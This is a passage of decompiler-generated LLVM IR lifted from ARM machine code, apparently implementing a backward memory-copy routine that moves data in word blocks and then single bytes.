  store i32 %v2_16b24, i32* %r2.global-to-local, align 4
  %v4_16b24 = sub i32 7, %v0_16b24
  %v5_16b24 = and i32 %v4_16b24, %v0_16b24
  %v6_16b24 = icmp slt i32 %v5_16b24, 0
  store i1 %v6_16b24, i1* %cpsr_v.global-to-local, align 1
  %v7_16b24 = icmp slt i32 %v2_16b24, 0
  store i1 %v7_16b24, i1* %cpsr_n.global-to-local, align 1
  %v8_16b24 = icmp eq i32 %v0_16b24, 8
  store i1 %v8_16b24, i1* %cpsr_z.global-to-local, align 1
  %v5_16b28 = icmp slt i32 %v0_16b24, 8
  br i1 %v5_16b28, label %dec_label_pc_16b74, label %dec_label_pc_16b2c

dec_label_pc_16b2c:                               ; preds = %dec_label_pc_16b24
  %v3_16b2c = load i32, i32* @r4, align 4
  %v5_16b2c = inttoptr i32 %v3_16b2c to i8*
  store i8* %v5_16b2c, i8** %stack_var_-8, align 4
  %v8_16b2c = load i32, i32* @lr, align 4
  %v2_16b30 = add i32 %v0_16b24, -28
  store i32 %v2_16b30, i32* %r2.global-to-local, align 4
  %v4_16b30 = sub i32 27, %v0_16b24
  %v5_16b30 = and i32 %v4_16b30, %v2_16b24
  %v6_16b30 = icmp slt i32 %v5_16b30, 0
  store i1 %v6_16b30, i1* %cpsr_v.global-to-local, align 1
  %v7_16b30 = icmp slt i32 %v2_16b30, 0
  store i1 %v7_16b30, i1* %cpsr_n.global-to-local, align 1
  %v8_16b30 = icmp eq i32 %v2_16b24, 20
  store i1 %v8_16b30, i1* %cpsr_z.global-to-local, align 1
  %v5_16b34 = icmp slt i32 %v2_16b24, 20
  br i1 %v5_16b34, label %dec_label_pc_16b50, label %dec_label_pc_16b38

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16b2c, %dec_label_pc_16b38.dec_label_pc_16b38_crit_edge
  %v0_16b3c = phi i32 [ %v1_16b44, %dec_label_pc_16b38.dec_label_pc_16b38_crit_edge ], [ %v0_16b3c37, %dec_label_pc_16b2c ]
  %v0_16b38 = phi i32 [ %v0_16b38.pre, %dec_label_pc_16b38.dec_label_pc_16b38_crit_edge ], [ %v0_16b3836, %dec_label_pc_16b2c ]
  %v1_16b38 = add i32 %v0_16b38, -4
  %v2_16b38 = inttoptr i32 %v1_16b38 to i32*
  %v3_16b38 = load i32, i32* %v2_16b38, align 4
  %v4_16b38 = add i32 %v0_16b38, -8
  %v5_16b38 = inttoptr i32 %v4_16b38 to i32*
  %v6_16b38 = load i32, i32* %v5_16b38, align 4
  store i32 %v6_16b38, i32* %r4.global-to-local, align 4
  %v7_16b38 = add i32 %v0_16b38, -12
  %v8_16b38 = inttoptr i32 %v7_16b38 to i32*
  %v9_16b38 = load i32, i32* %v8_16b38, align 4
  store i32 %v9_16b38, i32* %ip.global-to-local, align 4
  %v10_16b38 = add i32 %v0_16b38, -16
  %v11_16b38 = inttoptr i32 %v10_16b38 to i32*
  %v12_16b38 = load i32, i32* %v11_16b38, align 4
  store i32 %v12_16b38, i32* %lr.global-to-local, align 4
  store i32 %v10_16b38, i32* %r1.global-to-local, align 4
  %v1_16b3c = add i32 %v0_16b3c, -16
  %v2_16b3c = inttoptr i32 %v1_16b3c to i32*
  store i32 %v3_16b38, i32* %v2_16b3c, align 4
  %v4_16b3c = add i32 %v0_16b3c, -12
  %v5_16b3c = inttoptr i32 %v4_16b3c to i32*
  %v6_16b3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16b3c, i32* %v5_16b3c, align 4
  %v7_16b3c = add i32 %v0_16b3c, -8
  %v8_16b3c = inttoptr i32 %v7_16b3c to i32*
  %v9_16b3c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16b3c, i32* %v8_16b3c, align 4
  %v10_16b3c = add i32 %v0_16b3c, -4
  %v11_16b3c = inttoptr i32 %v10_16b3c to i32*
  %v12_16b3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16b3c, i32* %v11_16b3c, align 4
  store i32 %v1_16b3c, i32* %r0.global-to-local, align 4
  %v0_16b40 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b40 = add i32 %v0_16b40, -4
  %v2_16b40 = inttoptr i32 %v1_16b40 to i32*
  %v3_16b40 = load i32, i32* %v2_16b40, align 4
  store i32 %v3_16b40, i32* @r3, align 4
  %v4_16b40 = add i32 %v0_16b40, -8
  %v5_16b40 = inttoptr i32 %v4_16b40 to i32*
  %v6_16b40 = load i32, i32* %v5_16b40, align 4
  store i32 %v6_16b40, i32* %r4.global-to-local, align 4
  %v7_16b40 = add i32 %v0_16b40, -12
  %v8_16b40 = inttoptr i32 %v7_16b40 to i32*
  %v9_16b40 = load i32, i32* %v8_16b40, align 4
  store i32 %v9_16b40, i32* @ip, align 4
  %v10_16b40 = add i32 %v0_16b40, -16
  %v11_16b40 = inttoptr i32 %v10_16b40 to i32*
  %v12_16b40 = load i32, i32* %v11_16b40, align 4
  store i32 %v12_16b40, i32* %lr.global-to-local, align 4
  store i32 %v10_16b40, i32* %r1.global-to-local, align 4
  %v1_16b44 = add i32 %v0_16b3c, -32
  %v2_16b44 = inttoptr i32 %v1_16b44 to i32*
  store i32 %v3_16b40, i32* %v2_16b44, align 4
  %v4_16b44 = add i32 %v0_16b3c, -28
  %v5_16b44 = inttoptr i32 %v4_16b44 to i32*
  %v6_16b44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16b44, i32* %v5_16b44, align 4
  %v7_16b44 = add i32 %v0_16b3c, -24
  %v8_16b44 = inttoptr i32 %v7_16b44 to i32*
  %v9_16b44 = load i32, i32* @ip, align 4
  store i32 %v9_16b44, i32* %v8_16b44, align 4
  %v10_16b44 = add i32 %v0_16b3c, -20
  %v11_16b44 = inttoptr i32 %v10_16b44 to i32*
  %v12_16b44 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16b44, i32* %v11_16b44, align 4
  store i32 %v1_16b44, i32* %r0.global-to-local, align 4
  %v0_16b48 = load i32, i32* %r2.global-to-local, align 4
  %v2_16b48 = add i32 %v0_16b48, -32
  store i32 %v2_16b48, i32* %r2.global-to-local, align 4
  %v6_16b4c = icmp slt i32 %v0_16b48, 32
  br i1 %v6_16b4c, label %dec_label_pc_16b50.loopexit, label %dec_label_pc_16b38.dec_label_pc_16b38_crit_edge

dec_label_pc_16b38.dec_label_pc_16b38_crit_edge:  ; preds = %dec_label_pc_16b38
  %v0_16b38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b38

dec_label_pc_16b50.loopexit:                      ; preds = %dec_label_pc_16b38
  %v4_16b48 = sub i32 31, %v0_16b48
  %v5_16b48 = and i32 %v4_16b48, %v0_16b48
  %v6_16b48 = icmp slt i32 %v5_16b48, 0
  %v7_16b48 = icmp slt i32 %v2_16b48, 0
  store i1 %v6_16b48, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16b48, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16b50

dec_label_pc_16b50:                               ; preds = %dec_label_pc_16b50.loopexit, %dec_label_pc_16b2c
  %v6_16b58 = phi i32 [ %v1_16b44, %dec_label_pc_16b50.loopexit ], [ %v0_16b3c37, %dec_label_pc_16b2c ]
  %v0_16b60.pr = phi i32 [ %v2_16b48, %dec_label_pc_16b50.loopexit ], [ %v2_16b30, %dec_label_pc_16b2c ]
  %v4_16b50 = add i32 %v0_16b60.pr, 16
  %v6_16b50 = sub i32 0, %v0_16b60.pr
  %v7_16b50 = and i32 %v4_16b50, %v6_16b50
  %v8_16b50 = icmp slt i32 %v7_16b50, 0
  store i1 %v8_16b50, i1* %cpsr_v.global-to-local, align 1
  %v9_16b50 = icmp slt i32 %v4_16b50, 0
  store i1 %v9_16b50, i1* %cpsr_n.global-to-local, align 1
  %v10_16b50 = icmp eq i32 %v4_16b50, 0
  store i1 %v10_16b50, i1* %cpsr_z.global-to-local, align 1
  %v5_16b54 = icmp slt i32 %v0_16b60.pr, -16
  br i1 %v5_16b54, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_16b50
  %v6_16b54 = load i32, i32* %r1.global-to-local, align 4
  %v7_16b54 = add i32 %v6_16b54, -4
  %v8_16b54 = inttoptr i32 %v7_16b54 to i32*
  %v9_16b54 = load i32, i32* %v8_16b54, align 4
  store i32 %v9_16b54, i32* @r3, align 4
  %v10_16b54 = add i32 %v6_16b54, -8
  %v11_16b54 = inttoptr i32 %v10_16b54 to i32*
  %v12_16b54 = load i32, i32* %v11_16b54, align 4
  store i32 %v12_16b54, i32* %r4.global-to-local, align 4
  %v13_16b54 = add i32 %v6_16b54, -12
  %v14_16b54 = inttoptr i32 %v13_16b54 to i32*
  %v15_16b54 = load i32, i32* %v14_16b54, align 4
  store i32 %v15_16b54, i32* @ip, align 4
  %v16_16b54 = add i32 %v6_16b54, -16
  %v17_16b54 = inttoptr i32 %v16_16b54 to i32*
  %v18_16b54 = load i32, i32* %v17_16b54, align 4
  store i32 %v18_16b54, i32* %lr.global-to-local, align 4
  store i32 %v16_16b54, i32* %r1.global-to-local, align 4
  %v7_16b58 = add i32 %v6_16b58, -16
  %v8_16b58 = inttoptr i32 %v7_16b58 to i32*
  store i32 %v9_16b54, i32* %v8_16b58, align 4
  %v10_16b58 = add i32 %v6_16b58, -12
  %v11_16b58 = inttoptr i32 %v10_16b58 to i32*
  %v12_16b58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_16b58, i32* %v11_16b58, align 4
  %v13_16b58 = add i32 %v6_16b58, -8
  %v14_16b58 = inttoptr i32 %v13_16b58 to i32*
  %v15_16b58 = load i32, i32* @ip, align 4
  store i32 %v15_16b58, i32* %v14_16b58, align 4
  %v16_16b58 = add i32 %v6_16b58, -4
  %v17_16b58 = inttoptr i32 %v16_16b58 to i32*
  %v18_16b58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_16b58, i32* %v17_16b58, align 4
  store i32 %v7_16b58, i32* %r0.global-to-local, align 4
  %v6_16b5c = load i32, i32* %r2.global-to-local, align 4
  %v7_16b5c = add i32 %v6_16b5c, -16
  store i32 %v7_16b5c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16b50, %bb147
  %v6_16b68 = phi i32 [ %v7_16b58, %bb147 ], [ %v6_16b58, %dec_label_pc_16b50 ]
  %v0_16b60 = phi i32 [ %v7_16b5c, %bb147 ], [ %v0_16b60.pr, %dec_label_pc_16b50 ]
  %v4_16b60 = add i32 %v0_16b60, 20
  store i32 %v4_16b60, i32* %r2.global-to-local, align 4
  %v6_16b60 = sub i32 0, %v0_16b60
  %v7_16b60 = and i32 %v4_16b60, %v6_16b60
  %v8_16b60 = icmp slt i32 %v7_16b60, 0
  store i1 %v8_16b60, i1* %cpsr_v.global-to-local, align 1
  %v9_16b60 = icmp slt i32 %v4_16b60, 0
  store i1 %v9_16b60, i1* %cpsr_n.global-to-local, align 1
  %v10_16b60 = icmp eq i32 %v4_16b60, 0
  store i1 %v10_16b60, i1* %cpsr_z.global-to-local, align 1
  %v5_16b64 = icmp slt i32 %v0_16b60, -20
  br i1 %v5_16b64, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_16b64 = load i32, i32* %r1.global-to-local, align 4
  %v7_16b64 = add i32 %v6_16b64, -4
  %v8_16b64 = inttoptr i32 %v7_16b64 to i32*
  %v9_16b64 = load i32, i32* %v8_16b64, align 4
  store i32 %v9_16b64, i32* @r3, align 4
  %v10_16b64 = add i32 %v6_16b64, -8
  %v11_16b64 = inttoptr i32 %v10_16b64 to i32*
  %v12_16b64 = load i32, i32* %v11_16b64, align 4
  store i32 %v12_16b64, i32* @ip, align 4
  %v13_16b64 = add i32 %v6_16b64, -12
  %v14_16b64 = inttoptr i32 %v13_16b64 to i32*
  %v15_16b64 = load i32, i32* %v14_16b64, align 4
  store i32 %v15_16b64, i32* %lr.global-to-local, align 4
  store i32 %v13_16b64, i32* %r1.global-to-local, align 4
  %v7_16b68 = add i32 %v6_16b68, -12
  %v8_16b68 = inttoptr i32 %v7_16b68 to i32*
  store i32 %v9_16b64, i32* %v8_16b68, align 4
  %v10_16b68 = add i32 %v6_16b68, -8
  %v11_16b68 = inttoptr i32 %v10_16b68 to i32*
  %v12_16b68 = load i32, i32* @ip, align 4
  store i32 %v12_16b68, i32* %v11_16b68, align 4
  %v13_16b68 = add i32 %v6_16b68, -4
  %v14_16b68 = inttoptr i32 %v13_16b68 to i32*
  %v15_16b68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16b68, i32* %v14_16b68, align 4
  store i32 %v7_16b68, i32* %r0.global-to-local, align 4
  %v6_16b6c = load i32, i32* %r2.global-to-local, align 4
  %v7_16b6c = add i32 %v6_16b6c, -12
  store i32 %v7_16b6c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_16b8c45 = phi i32 [ %v6_16b68, %.thread2 ], [ %v7_16b68, %bb148 ]
  %v0_16b7443 = phi i32 [ %v4_16b60, %.thread2 ], [ %v7_16b6c, %bb148 ]
  %v2_16b70 = load i8*, i8** %stack_var_-8, align 4
  %v3_16b70 = ptrtoint i8* %v2_16b70 to i32
  store i32 %v3_16b70, i32* @r4, align 4
  store i32 %v8_16b2c, i32* @lr, align 4
  br label %dec_label_pc_16b74

dec_label_pc_16b74:                               ; preds = %dec_label_pc_16b24, %.thread4
  %v7_16b84 = phi i32 [ %v0_16b3c37, %dec_label_pc_16b24 ], [ %v6_16b8c45, %.thread4 ]
  %v0_16b74 = phi i32 [ %v2_16b24, %dec_label_pc_16b24 ], [ %v0_16b7443, %.thread4 ]
  %v2_16b74 = add i32 %v0_16b74, 8
  store i32 %v2_16b74, i32* %r2.global-to-local, align 4
  %v4_16b74 = sub i32 0, %v0_16b74
  %v5_16b74 = and i32 %v2_16b74, %v4_16b74
  %v6_16b74 = icmp slt i32 %v5_16b74, 0
  store i1 %v6_16b74, i1* %cpsr_v.global-to-local, align 1
  %v7_16b74 = icmp slt i32 %v2_16b74, 0
  store i1 %v7_16b74, i1* %cpsr_n.global-to-local, align 1
  %v8_16b74 = icmp eq i32 %v2_16b74, 0
  store i1 %v8_16b74, i1* %cpsr_z.global-to-local, align 1
  %v5_16b78 = icmp slt i32 %v0_16b74, -8
  br i1 %v5_16b78, label %bb150, label %dec_label_pc_16b7c

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b74
  %v6_16b7c = add i32 %v0_16b74, 4
  store i32 %v6_16b7c, i32* %r2.global-to-local, align 4
  %v8_16b7c = sub i32 -5, %v0_16b74
  %v9_16b7c = and i32 %v8_16b7c, %v2_16b74
  %v10_16b7c = icmp slt i32 %v9_16b7c, 0
  store i1 %v10_16b7c, i1* %cpsr_v.global-to-local, align 1
  %v11_16b7c = icmp slt i32 %v6_16b7c, 0
  store i1 %v11_16b7c, i1* %cpsr_n.global-to-local, align 1
  %v12_16b7c = icmp eq i32 %v2_16b74, 4
  store i1 %v12_16b7c, i1* %cpsr_z.global-to-local, align 1
  %v5_16b80 = icmp slt i32 %v2_16b74, 4
  %v6_16b80 = load i32, i32* %r1.global-to-local, align 4
  %v7_16b80 = add i32 %v6_16b80, -4
  %v8_16b80 = inttoptr i32 %v7_16b80 to i32*
  %v9_16b80 = load i32, i32* %v8_16b80, align 4
  store i32 %v9_16b80, i32* @r3, align 4
  br i1 %v5_16b80, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_16b7c
  store i32 %v7_16b80, i32* %r1.global-to-local, align 4
  %v8_16b84 = add i32 %v7_16b84, -4
  %v9_16b84 = inttoptr i32 %v8_16b84 to i32*
  store i32 %v9_16b80, i32* %v9_16b84, align 4
  %v10_16b84 = load i32, i32* %r0.global-to-local, align 4
  %v11_16b84 = add i32 %v10_16b84, -4
  store i32 %v11_16b84, i32* %r0.global-to-local, align 4
  %v0_16b94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_16b7c
  %v10_16b88 = add i32 %v6_16b80, -8
  %v11_16b88 = inttoptr i32 %v10_16b88 to i32*
  %v12_16b88 = load i32, i32* %v11_16b88, align 4
  store i32 %v12_16b88, i32* @ip, align 4
  store i32 %v10_16b88, i32* %r1.global-to-local, align 4
  %v7_16b8c = add i32 %v7_16b84, -8
  %v8_16b8c = inttoptr i32 %v7_16b8c to i32*
  store i32 %v9_16b80, i32* %v8_16b8c, align 4
  %v10_16b8c = add i32 %v7_16b84, -4
  %v11_16b8c = inttoptr i32 %v10_16b8c to i32*
  %v12_16b8c = load i32, i32* @ip, align 4
  store i32 %v12_16b8c, i32* %v11_16b8c, align 4
  store i32 %v7_16b8c, i32* %r0.global-to-local, align 4
  %v6_16b90 = load i32, i32* %r2.global-to-local, align 4
  %v7_16b90 = add i32 %v6_16b90, -4
  store i32 %v7_16b90, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_16b74, %dec_label_pc_16b04, %dec_label_pc_16d38, %dec_label_pc_16ccc, %dec_label_pc_16c60, %bb149
  %v2_16b98 = phi i32 [ %v11_16b84, %.thread8 ], [ %v0_16c3020, %.thread14 ], [ %v7_16b84, %dec_label_pc_16b74 ], [ %v2_16b08, %dec_label_pc_16b04 ], [ %v2_16ba453, %dec_label_pc_16d38 ], [ %v2_16ba452, %dec_label_pc_16ccc ], [ %v2_16ba451, %dec_label_pc_16c60 ], [ %v7_16b8c, %bb149 ]
  %v0_16b94 = phi i32 [ %v0_16b94.pre, %.thread8 ], [ %v2_16bd8, %.thread14 ], [ %v2_16b74, %dec_label_pc_16b74 ], [ %v2_16b0c, %dec_label_pc_16b04 ], [ %v0_16b9449, %dec_label_pc_16d38 ], [ %v0_16b9448, %dec_label_pc_16ccc ], [ %v0_16b9447, %dec_label_pc_16c60 ], [ %v7_16b90, %bb149 ]
  %v1_16b94 = add i32 %v0_16b94, 4
  store i32 %v1_16b94, i32* %r2.global-to-local, align 4
  %v3_16b94 = sub i32 0, %v0_16b94
  %v4_16b94 = and i32 %v1_16b94, %v3_16b94
  %v5_16b94 = icmp slt i32 %v4_16b94, 0
  store i1 %v5_16b94, i1* %cpsr_v.global-to-local, align 1
  %v6_16b94 = icmp slt i32 %v1_16b94, 0
  store i1 %v6_16b94, i1* %cpsr_n.global-to-local, align 1
  %v7_16b94 = icmp eq i32 %v1_16b94, 0
  store i1 %v7_16b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b94, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_16b9c = add i32 %v0_16b94, 2
  %v3_16b9c = sub i32 -3, %v0_16b94
  %v4_16b9c = and i32 %v3_16b9c, %v1_16b94
  %v5_16b9c = icmp slt i32 %v4_16b9c, 0
  store i1 %v5_16b9c, i1* %cpsr_v.global-to-local, align 1
  %v6_16b9c = icmp slt i32 %v1_16b9c, 0
  store i1 %v6_16b9c, i1* %cpsr_n.global-to-local, align 1
  %v7_16b9c = icmp eq i32 %v1_16b94, 2
  store i1 %v7_16b9c, i1* %cpsr_z.global-to-local, align 1
  %v0_16ba0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ba0 = add i32 %v0_16ba0, -1
  %v2_16ba0 = inttoptr i32 %v1_16ba0 to i8*
  %v3_16ba0 = load i8, i8* %v2_16ba0, align 1
  %v4_16ba0 = zext i8 %v3_16ba0 to i32
  store i32 %v4_16ba0, i32* @r3, align 4
  store i32 %v1_16ba0, i32* %r1.global-to-local, align 4
  %v3_16ba4 = add i32 %v2_16b98, -1
  %v4_16ba4 = inttoptr i32 %v3_16ba4 to i8*
  store i8 %v3_16ba0, i8* %v4_16ba4, align 1
  %v5_16ba4 = load i32, i32* %r0.global-to-local, align 4
  %v6_16ba4 = add i32 %v5_16ba4, -1
  store i32 %v6_16ba4, i32* %r0.global-to-local, align 4
  %v0_16ba8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16ba8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16ba8 = xor i1 %v0_16ba8, %v1_16ba8
  br i1 %v2_16ba8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_16ba8 = load i32, i32* %r1.global-to-local, align 4
  %v4_16ba8 = add i32 %v3_16ba8, -1
  %v5_16ba8 = inttoptr i32 %v4_16ba8 to i8*
  %v6_16ba8 = load i8, i8* %v5_16ba8, align 1
  %v7_16ba8 = zext i8 %v6_16ba8 to i32
  store i32 %v7_16ba8, i32* @r3, align 4
  store i32 %v4_16ba8, i32* %r1.global-to-local, align 4
  %v6_16bac = add i32 %v5_16ba4, -2
  %v7_16bac = inttoptr i32 %v6_16bac to i8*
  store i8 %v6_16ba8, i8* %v7_16bac, align 1
  %v8_16bac = load i32, i32* %r0.global-to-local, align 4
  %v9_16bac = add i32 %v8_16bac, -1
  store i32 %v9_16bac, i32* %r0.global-to-local, align 4
  %v1_16bb0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16bb0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_16bb4 = phi i32 [ %v9_16bac, %bb152 ], [ %v6_16ba4, %bb151 ]
  %v2_16bb4 = phi i1 [ %v2_16bb0.pre, %bb152 ], [ %v1_16ba8, %bb151 ]
  %v1_16bb4 = phi i1 [ %v1_16bb0.pre, %bb152 ], [ %v0_16ba8, %bb151 ]
  %v0_16bb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16bb0 = xor i1 %v2_16bb4, %v1_16bb4
  %v4_16bb0 = or i1 %v0_16bb0, %v3_16bb0
  br i1 %v4_16bb0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_16bb0 = load i32, i32* %r1.global-to-local, align 4
  %v6_16bb0 = add i32 %v5_16bb0, -1
  %v7_16bb0 = inttoptr i32 %v6_16bb0 to i8*
  %v8_16bb0 = load i8, i8* %v7_16bb0, align 1
  %v9_16bb0 = zext i8 %v8_16bb0 to i32
  store i32 %v9_16bb0, i32* @r3, align 4
  store i32 %v6_16bb0, i32* %r1.global-to-local, align 4
  %v8_16bb4 = add i32 %v7_16bb4, -1
  %v9_16bb4 = inttoptr i32 %v8_16bb4 to i8*
  store i8 %v8_16bb0, i8* %v9_16bb4, align 1
  %v10_16bb4 = load i32, i32* %r0.global-to-local, align 4
  %v11_16bb4 = add i32 %v10_16bb4, -1
  store i32 %v11_16bb4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16b14
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_16bbc = icmp eq i32 %v1_16b14, 1
  store i1 %v8_16bbc, i1* %cpsr_n.global-to-local, align 1
  %v9_16bbc = icmp eq i32 %v1_16b14, 2
  store i1 %v9_16bbc, i1* %cpsr_z.global-to-local, align 1
  %v1_16bc0 = add i32 %v2_16b04, -1
  %v2_16bc0 = inttoptr i32 %v1_16bc0 to i8*
  %v3_16bc0 = load i8, i8* %v2_16bc0, align 1
  %v4_16bc0 = zext i8 %v3_16bc0 to i32
  store i32 %v4_16bc0, i32* @r3, align 4
  store i32 %v1_16bc0, i32* %r1.global-to-local, align 4
  %v3_16bc4 = add i32 %v2_16b08, -1
  %v4_16bc4 = inttoptr i32 %v3_16bc4 to i8*
  store i8 %v3_16bc0, i8* %v4_16bc4, align 1
  %v5_16bc4 = load i32, i32* %r0.global-to-local, align 4
  %v6_16bc4 = add i32 %v5_16bc4, -1
  store i32 %v6_16bc4, i32* %r0.global-to-local, align 4
  br i1 %v8_16bbc, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_16bbc
  %v6_16bc8 = load i32, i32* %r1.global-to-local, align 4
  %v7_16bc8 = add i32 %v6_16bc8, -1
  %v8_16bc8 = inttoptr i32 %v7_16bc8 to i8*
  %v9_16bc8 = load i8, i8* %v8_16bc8, align 1
  %v10_16bc8 = zext i8 %v9_16bc8 to i32
  store i32 %v10_16bc8, i32* @r3, align 4
  store i32 %v7_16bc8, i32* %r1.global-to-local, align 4
  %v9_16bcc = add i32 %v5_16bc4, -2
  %v10_16bcc = inttoptr i32 %v9_16bcc to i8*
  store i8 %v9_16bc8, i8* %v10_16bcc, align 1
  %v11_16bcc = load i32, i32* %r0.global-to-local, align 4
  %v12_16bcc = add i32 %v11_16bcc, -1
  store i32 %v12_16bcc, i32* %r0.global-to-local, align 4
  br i1 %v9_16bbc, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_16bd0 = load i32, i32* %r1.global-to-local, align 4
  %v9_16bd0 = add i32 %v8_16bd0, -1
  %v10_16bd0 = inttoptr i32 %v9_16bd0 to i8*
  %v11_16bd0 = load i8, i8* %v10_16bd0, align 1
  %v12_16bd0 = zext i8 %v11_16bd0 to i32
  store i32 %v12_16bd0, i32* @r3, align 4
  store i32 %v9_16bd0, i32* %r1.global-to-local, align 4
  %v11_16bd4 = add i32 %v11_16bcc, -2
  %v12_16bd4 = inttoptr i32 %v11_16bd4 to i8*
  store i8 %v11_16bd0, i8* %v12_16bd4, align 1
  %v13_16bd4 = load i32, i32* %r0.global-to-local, align 4
  %v14_16bd4 = add i32 %v13_16bd4, -1
  store i32 %v14_16bd4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_16bbc, %bb155
  %v0_16c3020 = phi i32 [ %v12_16bcc, %bb154 ], [ %v6_16bc4, %dec_label_pc_16bbc ], [ %v14_16bd4, %bb155 ]
  %v0_16bd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16bd8 = load i32, i32* @ip, align 4
  %v2_16bd8 = sub i32 %v0_16bd8, %v1_16bd8
  store i32 %v2_16bd8, i32* %r2.global-to-local, align 4
  %v4_16bd8 = xor i32 %v1_16bd8, %v0_16bd8
  %v5_16bd8 = xor i32 %v2_16bd8, %v0_16bd8
  %v6_16bd8 = and i32 %v5_16bd8, %v4_16bd8
  %v7_16bd8 = icmp slt i32 %v6_16bd8, 0
  store i1 %v7_16bd8, i1* %cpsr_v.global-to-local, align 1
  %v8_16bd8 = icmp slt i32 %v2_16bd8, 0
  store i1 %v8_16bd8, i1* %cpsr_n.global-to-local, align 1
  %v9_16bd8 = icmp eq i32 %v0_16bd8, %v1_16bd8
  store i1 %v9_16bd8, i1* %cpsr_z.global-to-local, align 1
  %v5_16bdc = icmp slt i32 %v0_16bd8, %v1_16bd8
  br i1 %v5_16bdc, label %bb150, label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %.thread14
  %v0_16be0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16be0 = urem i32 %v0_16be0, 4
  store i32 %v1_16be0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16be0 = icmp eq i32 %v1_16be0, 0
  store i1 %v2_16be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16be0, label %dec_label_pc_16b24, label %dec_label_pc_16be8

dec_label_pc_16be8:                               ; preds = %dec_label_pc_16b1c, %dec_label_pc_16be0
  %v0_16c3019 = phi i32 [ %v2_16b08, %dec_label_pc_16b1c ], [ %v0_16c3020, %dec_label_pc_16be0 ]
  %v0_16cdc = phi i32 [ %v2_16b0c, %dec_label_pc_16b1c ], [ %v2_16bd8, %dec_label_pc_16be0 ]
  %v0_16be8 = phi i32 [ %v2_16b04, %dec_label_pc_16b1c ], [ %v0_16be0, %dec_label_pc_16be0 ]
  %v0_16bf0 = phi i32 [ %v1_16b1c, %dec_label_pc_16b1c ], [ %v1_16be0, %dec_label_pc_16be0 ]
  %v1_16be8 = and i32 %v0_16be8, -4
  store i32 %v1_16be8, i32* %r1.global-to-local, align 4
  %v1_16bec = inttoptr i32 %v1_16be8 to i32*
  %v2_16bec = load i32, i32* %v1_16bec, align 4
  store i32 %v2_16bec, i32* @r3, align 4
  %v7_16bf0 = icmp ult i32 %v0_16bf0, 2
  %v2_16cd4 = add i32 %v0_16cdc, -12
  %v4_16cd4 = sub i32 11, %v0_16cdc
  %v5_16cd4 = and i32 %v4_16cd4, %v0_16cdc
  %v6_16cd4 = icmp slt i32 %v5_16cd4, 0
  store i1 %v6_16cd4, i1* %cpsr_v.global-to-local, align 1
  %v7_16cd4 = icmp slt i32 %v2_16cd4, 0
  store i1 %v7_16cd4, i1* %cpsr_n.global-to-local, align 1
  %v8_16cd4 = icmp eq i32 %v0_16cdc, 12
  store i1 %v8_16cd4, i1* %cpsr_z.global-to-local, align 1
  %v5_16cd8 = icmp slt i32 %v0_16cdc, 12
  br i1 %v7_16bf0, label %dec_label_pc_16cd4, label %dec_label_pc_16bf8

dec_label_pc_16bf8:                               ; preds = %dec_label_pc_16be8
  %v8_16bf0 = icmp eq i32 %v0_16bf0, 2
  br i1 %v8_16bf0, label %dec_label_pc_16c68, label %dec_label_pc_16bfc

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16bf8
  br i1 %v5_16cd8, label %dec_label_pc_16c48, label %dec_label_pc_16c04

dec_label_pc_16c04:                               ; preds = %dec_label_pc_16bfc
  store i32 %v2_16cd4, i32* %r2.global-to-local, align 4
  %v3_16c08 = load i32, i32* @r4, align 4
  store i32 %v3_16c08, i32* %stack_var_-12, align 4
  %v6_16c08 = load i32, i32* @r5, align 4
  %v8_16c08 = inttoptr i32 %v6_16c08 to i8*
  store i8* %v8_16c08, i8** %stack_var_-8, align 4
  %v11_16c08 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16c0c

